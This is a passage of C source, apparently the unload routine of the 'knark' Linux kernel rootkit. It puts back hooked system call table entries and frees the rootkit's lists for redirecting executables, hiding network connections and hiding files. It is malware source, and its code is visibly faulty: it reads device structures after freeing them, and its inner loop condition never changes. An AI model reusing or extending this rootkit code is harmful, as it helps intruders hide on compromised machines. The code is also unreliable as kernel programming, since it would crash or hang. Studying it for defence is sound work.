    sys_call_table[SYS_settimeofday] = original_settimeofday;
    sys_call_table[SYS_execve] = original_execve;
    
    knark_clear_redirects();
    kfree(knark_redirect_list);
    knark_clear_nethides();
    kfree(knark_nethide_list);
    for(i = 0; i < kfs->f_ndevs; i++){
      kfree(kfs->f_dev[i]);
      for(n = 0; kfs->f_dev[i]->d_name; n++)
	kfree(kfs->f_dev[i]->d_name);
    }

    kfree(kfs);
}

EXPORT_NO_SYMBOLS;
